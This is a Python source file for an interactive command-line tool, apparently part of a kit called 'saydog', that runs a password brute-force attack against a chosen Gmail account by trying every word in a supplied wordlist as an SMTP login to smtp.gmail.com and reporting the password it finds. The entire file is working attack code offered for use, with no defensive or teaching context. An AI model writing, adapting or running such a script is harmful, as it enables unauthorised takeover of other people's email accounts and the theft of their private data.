import smtplib
import os,sys
import time

u='\033[4m'
w='\x1b[00m'
r='\x1b[91m'
c='\x1b[36;1m'
y ='\x1b[33m'

def exit():
        print(r+'[!]'+w+' The user forces it to stop')
        print(r+'[!]'+w+' Exiting program')
        sys.exit(1)
        
def corrupt():
        print(r+'[?]'+w+' Command not found, please type help')
        
def help():
  print('')
  print('BRUTEFORCE GMAIL')
  print('---------------')
  print('Bruteforce attack gmail')
  print('command                                            example')
  print('-------                                            -------')
  print('set username [target]        set username saydog@gmail.com')
  print('set wordlist [path/name]             set wordlist pass.txt')
  print('show, show value                                show value')
  print('run, go, exploit                                   exploit')
  print('')

user = ''
file = ''

def server():
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls()

def main():
	global user
	global file
	while True:
		usr = input(w+'saydog('+r+'socialbrute/gmail'+w+') > ')
		if usr == 'help':
			help()
		elif  usr == 'clear':
			os.system('clear')
		elif  usr == 'back':
			sys.exit(0)
		elif  usr == 'exit':
			exit()
		elif 'set username' in usr:
			user = usr.split()[(-1)]
			print('username > '+user)
		elif 'set wordlist' in usr:
			file = usr.split()[(-1)]
			print('wordlist > '+file)
		elif usr == 'show' or usr == 'show value':
			print('')
			print('-------------------------')
			print('username : '+user)
			print('wordlist : '+file)
			print('-------------------------')
			print('')
		elif usr == 'run' or usr == 'go' or usr =='exploit':
			print(y+'[-]'+w+' Starting bruteforce attack to '+user)
			print(y+'[-]'+w+' List of words found on '+file)
			print('')
			time.sleep(3)
			print(y+'[-]'+w+' Preparing for attack ...')
			time.sleep(2)
			print(c+'[!]'+w+' Bruteforce is running')
			print('')
			file = open(file,'r')
			for password in file:
				try:
					smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
					smtpserver.ehlo()
					smtpserver.starttls()
					smtpserver.login(user, password)
					print(c+'[+]'+w+' Successful exploiting')
					print(c+'[+]'+w+' Password found: %s' % password)
					time.sleep(1)
				except smtplib.SMTPAuthenticationError:
					print(y+'[-]'+w+' Password incorrect: %s' % password.strip())
				except FileNotFoundError:
					print(r+'[!] Error:'+w+' [username] or [wordlist] not found')
				except KeyboardInterrupt:
					exit()
		else:
			corrupt()
		
main()